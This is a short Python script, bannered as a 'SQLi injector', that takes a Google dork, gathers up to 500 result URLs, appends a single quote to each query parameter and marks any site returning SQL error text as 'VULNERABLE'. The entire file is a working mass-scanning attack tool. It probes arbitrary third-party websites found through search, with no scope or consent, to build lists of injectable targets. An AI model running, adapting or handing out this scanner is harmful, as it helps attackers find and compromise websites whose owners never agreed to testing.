from googlesearch import search
import requests, sys, urllib

print("""
Aghorii001
SQLi injector - by Ravii | Instagram: @raw_be001
""")


dork = input("[+] Dork: ")
print(" ")
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0'}
output = []

errorMessage = [
    "SQL syntax",
    "SQL",
    "Sql",
    "sql",
    "MySql",
    "MySQL",
    "mysql",
    "Syntax",
    "SYNTAX",
    "You have an error",
]

def inject(url):
    base = url.split("?")[0] + "?"
    parameters = url.split("?")[1]
    count = 0
    if "&" in parameters: 
        parameters = parameters.split("&")
        for parameter in parameters:
            if count == 0:
                url = base + parameter + "'"
                count = count + 1
            else:
                url = url + "&" + parameter + "'"
    else:
        url = base + parameters + "'"
    return url

def check(url): 
    c = 0
    for error in errorMessage:
        try:
          r = requests.get(url, headers=headers)
        except requests.exceptions.ConnectionError:
          break
        except requests.exceptions.TooManyRedirects:
            break

        if error in r.text:
            c = 1
            print(url + "\033[1;32m [VULNERABLE] \033[1;97m ")
            break
    
    if c == 0:
        print(url + "\033[1;31m [NOT VULNERABLE] \033[1;97m ")
        
try:
    for result in search (dork, stop=500):
        output.append(result)
    for url in output:
        if "?" in url:
          injected = inject(url)
          check(injected)

except urllib.error.HTTPError:
    print(sys.argv[0] + " - HTTP Error 429 - Too Many Requests | Try again later")
    sys.exit()
